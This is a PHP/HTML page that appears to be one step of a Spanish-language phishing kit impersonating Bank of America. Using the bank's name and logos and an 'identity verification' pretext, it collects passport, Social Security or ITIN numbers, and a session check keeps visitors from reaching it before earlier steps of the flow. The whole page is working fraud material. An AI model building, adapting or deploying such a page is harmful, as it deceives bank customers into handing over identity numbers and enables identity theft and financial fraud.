<?php
require "ayudante.php";
if (is_session_started() === FALSE) {
    session_start();
}
if(!array_key_exists("permiso3",$_SESSION)){
    header("location:index.php");
  }
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos2.css" />
    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <img src="img/logo-entrar.png" alt="logo">
            <img src="img/protegida-area.png" class="protegida" alt="protegida">
        </div>
        <div class="header2">
            <h1>Verificar su Identidad</h1>
        </div>
        <div class="section">
            <div class="principal">
                <h2>Casi hemos terminado</h2>
                <p>Proporcione la siguiente información para completar el proceso de verificación</p>
                <p class="error" id="error">________</p>
                <form autocomplete="off" id="fident" style="font-family: 'cnx-regular', Arial, Helvetica, sans-serif;font-size:16px;">
                    <div class="fgrupo">
                        <label for="docu">Tipo de documento</label>
                        <select name="docu" id="docu" style="height: 27px;width:212px;">
                        <option value="">Seleccione</option>
                            <option value="pasaporte">Pasaporte</option>
                            <option value="ssn">Número de Seguro Social (SSN)</option>
                            <option value="itin">Número de Identificación Personal del Contribuyente (ITIN)</option>
                        </select>
                    </div>
                    <div class="fgrupo">
                        <label for="nident">Número de Identificación</label>
                        <input class="inputCard" type="text" name="ndocu" id="ndocu" placeholder="123456789" style="height: 22px;width:202px;" />
                    </div>
                    
                    <p>
                        Recuerde ingresar sus datos cuidadosamente a fin de comprobar su identidad y seguir proporcionandole nuestros servicios de Online Banking
                    </p>


                    <div class="fgrupo">
                        <button type="button" id="bdocu" class="btn principal">CONFIRMAR</button>
                    </div>
                </form>
            </div>
            <div class="derecha">
                <img src="img/ayuda-docu.png" alt="documento">
            </div>
        </div>
        <div class="footer">
            <img src="img/footer.png" alt="footer">
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>